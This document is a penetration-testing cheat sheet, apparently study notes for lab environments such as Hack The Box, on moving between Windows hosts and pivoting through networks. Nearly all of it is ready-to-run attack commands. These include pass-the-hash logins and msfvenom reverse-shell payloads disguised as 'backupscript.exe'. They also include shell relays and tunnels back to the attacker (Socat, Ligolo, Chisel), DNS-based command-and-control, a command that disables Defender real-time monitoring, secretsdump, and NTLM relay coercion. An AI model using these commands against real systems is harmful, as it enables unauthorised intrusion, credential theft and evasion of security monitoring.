## Windows Pivoting

Movement between Windows hosts in an AD environment. Three concerns:
1. **Authenticated remote execution** (RDP / WinRM / SMB / WMI).
2. **Network pivoting** when the next-hop host isn't directly reachable from Kali.
3. **File and clipboard movement** during interactive use.

---

### Remote Execution Options

| Tool | Auth | Shell type | Default port |
|------|------|------------|--------------|
| `evil-winrm` | password / NTLM / Kerberos | Full PowerShell | 5985 / 5986 |
| `impacket-psexec` | password / NTLM | Interactive, SYSTEM | 445 |
| `impacket-wmiexec` | password / NTLM | Semi-interactive, user | 135 + dyn |
| `impacket-smbexec` | password / NTLM | Non-interactive cmd | 445 |
| `xfreerdp` | password / NLA | GUI | 3389 |

#### evil-winrm

```bash
evil-winrm -i <ip> -u <user> -p <pass>
evil-winrm -i <ip> -u <user> -H <NTLM>
evil-winrm -i <ip> -u <user> -p <pass> -s /opt/scripts   # share local scripts
```

Inside evil-winrm:

```bash
menu
upload /path/local /target/path
download /target/path /path/local
invoke-binary /opt/binaries/SharpHound.exe
```

#### impacket-psexec

```bash
impacket-psexec <DOMAIN>/<user>@<ip> -hashes :<NTLM>
impacket-psexec <DOMAIN>/<user>:'<pass>'@<ip>
```

#### xfreerdp (with clipboard + drive sharing — easiest Windows file transfer)

```bash
## Quick — clipboard only
xfreerdp /u:'Bob' /p:'HTB_@cademy_stdnt!' /v:10.129.202.99 +clipboard

## With a shared loot drive (drag-and-drop both ways)
mkdir -p /home/kali/loot
xfreerdp3 /v:172.16.119.10 /u:'NEXURA\stom' /p:'<pass>' \
    /cert:ignore +clipboard /drive:loot,/home/kali/loot
```

- On the Windows victim, your share is `\\tsclient\loot`
- On Kali, files land in `/home/kali/loot`

#### RDP Pass-the-Hash (`/pth:`)

Requires Restricted Admin enabled on the target — see [AD Initial Access → RDP PtH](../3-exploitation/05-ad-initial-access.md).

#### RDP enumeration / security check

```bash
nmap -p 3389 --script rdp-enum-encryption <ip>
## If NLA = SUCCESS, you can reach the login screen with rdesktop
```

### Pivot Discovery

Always confirm what interfaces and routes the pivot host has — that tells you which subnets are reachable from it:

```bash
ifconfig                       # all NICs (Linux)
ipconfig                       # all NICs (Windows)
```

### Port Forwarding & Tunneling — Tool Map

| Tool | Transport | Direction | Use when |
|------|-----------|-----------|----------|
| **Ligolo-ng** | TLS over TCP | TUN interface (full subnet, native speed) | **Preferred for everything Windows** — no proxychains, no `-sT` nmap penalty |
| **SSH `-L` / `-R` / `-D`** | SSH (22) | Local, reverse, SOCKS | SSH available on the pivot |
| **Sshuttle** | SSH | Transparent VPN-style | Linux pivot with SSH — laziest Linux option |
| **Metasploit `autoroute` + SOCKS** | Meterpreter session | Routes whole subnet | You already have a meterpreter session |
| **Metasploit `portfwd`** | Meterpreter session | Local or reverse single port | Forward one service through a session |
| **Socat** | TCP | Catches a shell on the pivot, relays to Kali | No SSH, need a relay |
| **Plink** | SSH (Windows) | SOCKS / port | Windows pivot with PuTTY installed |
| **Rpivot** | TCP | Reverse SOCKS | Web pivoting from a low-priv Linux box |
| **Netsh portproxy** | TCP | Local | Windows pivot, no admin rights for service install |
| **DNScat2** | DNS | C2-style | Stealth; outbound is DNS-only |
| **Chisel** | HTTP/TCP | Reverse SOCKS | Most reliable through proxies |
| **Ptunnel-ng** | ICMP | Tunnel-over-ping | Only ICMP egresses |
| **SocksOverRDP** | RDP | SOCKS over RDP | Last-resort Windows RDP hop (painful — prefer Ligolo) |

### SSH Tunneling (when SSH is available)

```bash
## Local forward — open service on the victim that you can't reach directly
ssh -L <kali_port>:localhost:<victim_port> <victim_user>@<victim_ip>
## Then on Kali
nmap -v -sV -p <kali_port> localhost

## Reverse forward — make a Kali port reachable from the remote
ssh -R 9000:127.0.0.1:9000 user@jump-box

## Dynamic SOCKS — entire subnet via the jump box
ssh -D 1080 user@jump-box
```

### Sshuttle (transparent VPN-style)

Rewrites iptables on Kali so traffic to the internal subnet just works — no proxychains needed:

```bash
sudo sshuttle -r ubuntu@<pivot_ip> <internal_subnet/mask> -v
```

After this, commands like `nmap`, `evil-winrm`, browsers all reach the internal subnet directly.

### Metasploit — Ping Sweep, Autoroute, Port Forward

#### Ping sweep through a meterpreter session

```bash
run post/multi/gather/ping_sweep RHOSTS=<internal_subnet>
```

If ICMP is blocked, route the subnet through the session and scan with proxychains:

```bash
run autoroute -s <internal_subnet/mask>
## Then from Kali: proxychains nmap ...
```

Windows ping sweep without a tunnel (in cmd):

```bash
for /L %i in (1,1,254) do @ping 172.16.6.%i -n 1 -w 100 | find "Reply"
```

#### Build a tunnel through a pivot

```bash
## On Kali — create a payload for the pivot host
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=8080 \
    -f elf -o backupjob

## Start the handler
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <kali_ip>
set LPORT 8080
run
```

Execute the payload on the pivot, then route through it:

```bash
run autoroute -s <internal_subnet/mask>
run autoroute -p                                    # confirm routes
```

Now use proxychains from Kali:

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

#### Local TCP relay via meterpreter

```bash
help portfwd
portfwd add -l <kali_port> -p <dest_port> -r <dest_ip>

## Reach an internal Windows host as if it were on Kali
xfreerdp /v:localhost:<kali_port> /u:victor /p:'pass@123'
```

#### Reverse port forward (catch a shell on Kali from an internal host)

```bash
## In the existing meterpreter session
portfwd add -R -l <kali_port> -p <dest_port> -r <dest_ip>

## Background it and stage a listener
bg
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081
set LHOST 0.0.0.0
run

## Build payload for the internal Windows host
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<pivot_ip> LPORT=<pivot_port> \
    -f exe -o backupscript.exe
```

Execute the payload on the internal host — the shell tunnels through the pivot back to Kali.

### Socat (no SSH? relay shells through the pivot)

```bash
## On the pivot
socat TCP4-LISTEN:<pivot_port>,fork TCP4:<kali_ip>:<kali_port>

## On Kali — build the windows payload pointing at the pivot
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot_ip> LPORT=<pivot_port> \
    -f exe -o backupscript.exe

## Handler on Kali
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

Transfer the payload to the internal Windows host and execute it.

### Plink (SSH on a Windows pivot)

PuTTY's command-line SSH client — useful when the pivot is Windows with no native ssh.exe.

```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
## Configure proxychains for 127.0.0.1:9050, then:
mstsc.exe                                  # RDP through the SOCKS tunnel
```

### Rpivot (web pivoting)

Lightweight reverse SOCKS — good for pivoting to internal web apps.

```bash
git clone https://github.com/klsecservices/rpivot.git

## Server on Kali
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

## Client on the pivot
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

Browse the internal site through proxychains:

```bash
proxychains firefox-esr 172.16.5.135:80
```

> Make sure your `/etc/proxychains.conf` matches the tool — different tools use different ports.

### Netsh (Windows portproxy — pivot through an external Windows box)

```bash
netsh.exe interface portproxy add v4tov4 \
    listenport=<port on pivot> listenaddress=<ip of pivot> \
    connectport=<port of internal victim> connectaddress=<ip of internal victim>
```

### Ligolo-ng (preferred Windows pivot — fast, clean, TUN-based)

SocksOverRDP is miserable. Ligolo-ng spins up a TUN interface on Kali that maps directly to the pivot's network — no proxychains, no SOCKS, no `-sT` nmap penalty. Tools "just work" against internal IPs as if they were on your local network.

#### One-time setup on Kali

```bash
## Download both proxy + agent builds from
## https://github.com/nicocha30/ligolo-ng/releases

## Create the TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

#### Start the proxy (Kali — the C2 end)

```bash
./proxy -selfcert
```

#### Drop the agent on the pivot and connect back

```bash
## Windows pivot
.\agent.exe -connect <kali-ip>:11601 -ignore-cert

## Linux pivot
./agent -connect <kali-ip>:11601 -ignore-cert
```

#### Inside the proxy session — route the internal subnet through the agent

```bash
session                                 # pick the connected agent
start                                   # start tunneling

## On Kali, in another tab — add the route
sudo ip route add <internal_subnet/mask> dev ligolo
```

Now everything reaches the internal subnet natively:

```bash
nmap -sC -sV <internal-ip>              # full SYN scan — no proxychains, no -sT
evil-winrm -i <internal-ip> -u <user> -p '<pass>'
xfreerdp /v:<internal-ip> /u:<user> /p:'<pass>'
impacket-secretsdump <DOMAIN>/<user>:<pass>@<internal-ip>
```

#### Listener back to Kali (catch reverse shells through the tunnel)

```bash
## In the ligolo session
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

## On Kali
nc -lvnp 4444
```

Now a payload on the internal target with `LHOST=<pivot-ip> LPORT=4444` lands at your local netcat.

#### Quick reference

| Command | Purpose |
|---------|---------|
| `session` | Pick which connected agent to drive |
| `start` / `stop` | Toggle the TUN tunnel |
| `interface_list` | Show NICs on the agent |
| `interface_create --name ligolo` | Create a TUN if you didn't pre-make one |
| `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp` | Reverse-shell catcher via the tunnel |
| `listener_list` / `listener_del` | Manage forwarded listeners |

### Chisel (TCP over HTTP — most reliable through proxies)

Use when you need a direct connection from Kali to a host you can't reach (file transfers too painful, weird egress, etc.).

```bash
## On Kali — install
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel

## On Kali (server)
sudo ./chisel server --reverse -p 8080

## On compromised Windows host (client)
c:\tools\chisel.exe client <kali>:8080 R:socks
```

Then run anything you'd run on Kali through the SOCKS:

```bash
proxychains impacket-wmiexec dc01 -k
proxychains nmap -sT -Pn -sCV <ip>           # MUST be TCP-only over SOCKS
```

> nmap over proxychains must be `-sT` (full TCP connect) — SYN scans don't survive a SOCKS hop. Stick to ports you care about; it's slow.

### DNScat2 (DNS tunneling — high stealth)

Outbound C2 over DNS — useful when other egress is locked down.

```bash
## Server (Kali)
git clone https://github.com/iagox86/dnscat2.git
sudo ruby dnscat2.rb --dns host=<kali_ip>,port=53,domain=inlanefreight.local --no-cache

## PowerShell client (Windows victim)
git clone https://github.com/lukebaggett/dnscat2-powershell.git
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <kali_ip> -Domain inlanefreight.local \
    -PreSharedSecret <secret_from_server_startup> -Exec cmd
```

### Ptunnel-ng (ICMP tunnel — when only ping egresses)

```bash
## On the target/pivot
sudo ./ptunnel-ng -r <target_ip> -R 22

## On Kali
sudo ./ptunnel-ng -p <target_ip> -l 2222 -r <target_ip> -R 22
ssh -p 2222 -l ubuntu 127.0.0.1
```

### SocksOverRDP + Proxifier (tunnel through Windows RDP)

When no SSH is available on the Windows pivot, but you have RDP and admin:

```bash
## On the pivot (Windows)
## Transfer SocksOverRDP-x64.zip → unzip
regsvr32.exe SocksOverRDP-Plugin.dll
## If Defender flags this:
Set-MpPreference -DisableRealtimeMonitoring $true

## Connect onward
mstsc.exe                              # RDP to the next internal victim
## Transfer SocksOverRDPx64.zip → unzip → run SocksOverRDP-Server.exe on the internal
```

Then move Proxifier to the pivot and configure it to forward all traffic to `127.0.0.1:1080`.

> If RDP clipboard is disabled and you need to chain through Kali → Ubuntu → Windows, see the HTB walkthrough at <https://academy.hackthebox.com/app/module/158/section/1427>.

### File Movement During an RDP Session

- **Clipboard** — enabled via `+clipboard` in xfreerdp; copy/paste text directly.
- **Drive share** — `/drive:share,/root/rdp-share` exposes Kali path as `\\tsclient\share` on Windows.
- **SCP back to Kali** (after pulling files to a Windows folder):
  ```bash
  scp Administrator@<victim>:/C:/path/to/loot ./loot
  ```

### Coercing Authentication for Relay

| Tool | Mechanism |
|------|-----------|
| `printerbug` | Spoolss RPC `RpcRemoteFindFirstPrinterChangeNotificationEx` |
| `PetitPotam` | EFSRPC `EfsRpcOpenFileRaw` (and friends) |
| `DFSCoerce` | MS-DFSNM |
| `ShadowCoerce` | MS-FSRVP |

Used in combination with `impacket-ntlmrelayx -t ldap://<dc-ip>` to take over hosts that don't enforce SMB signing.

```bash
sudo impacket-ntlmrelayx -t ldap://<dc-ip> -smb2support
## In a separate tab
python3 printerbug.py <DOMAIN>/<user>:<pass>@<vuln-host> <kali-ip>
```

### See Also
- [AD Initial Access](../3-exploitation/05-ad-initial-access.md) — the credential/hash you need to authenticate.
- [Kerberos Attacks](./03-kerberos-attacks.md) — ticket-based variants of the above.
- [Credential Dumping](../4-post-exploitation/03-credential-dumping.md) — for each hop, dump and reuse.
